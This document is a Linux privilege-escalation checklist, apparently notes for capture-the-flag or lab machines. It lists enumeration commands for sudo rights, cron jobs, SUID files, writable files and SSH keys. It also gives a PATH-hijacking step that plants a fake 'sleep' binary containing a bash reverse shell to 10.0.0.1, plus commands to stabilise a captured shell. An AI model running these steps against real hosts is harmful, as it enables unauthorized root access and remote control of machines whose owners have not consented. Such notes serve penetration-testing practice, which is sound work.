
### CHECK LIST:

- __UserID, Username,Group:__
```bash
id
```

- __Privileges on the box:__
```bash
sudo -l
```

- __Directory to check:__
```bash
cd /tmp
cd /dev/shm
cd /home/<user>/.*
cd /opt
cd /var/opt
```

- __Look network processes__:
```bash
netstat -l
```

- __Look processes__:
```bash
./pspy64
ps aux | grep root
...
```

- __Look Bash files__:
```bash
cat /home/<user>/.bash*
```

- __Cronjobs__:
```bash
crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

- __SSH Keys__:
```bash
/home/<user>/.ssh/
```

- __Path Abuse__: 
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses

```bash
export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd /tmp
echo “bash -i >& /dev/tcp/10.0.0.1/4242 0>&1” > sleep
chmod +x sleep

/usr/bin/healthcheck
```

- __Writable files__:
```bash
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

- __SUID/GUID__
```bash
find / -perm -u=s -type f 2> /dev/null
find / -perm -g=s -type f 2> /dev/null
```

- __SSH TUNNEL__
```bash
ssh aubreanna@internal.thm -L80:localhost:8080

-L Local
```

- __STABLE SHELL__
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/tmp
export TERM=xterm-256color
alias ll='clear ; ls -lsaht --color=auto'
stty raw -echo ; fg ; reset
```

### YUM
* https://blog.ikuamike.io/posts/2021/package_managers_privesc/#method-1-creating-a-malicious-debian-package
* https://gtfobins.github.io/gtfobins/yum/
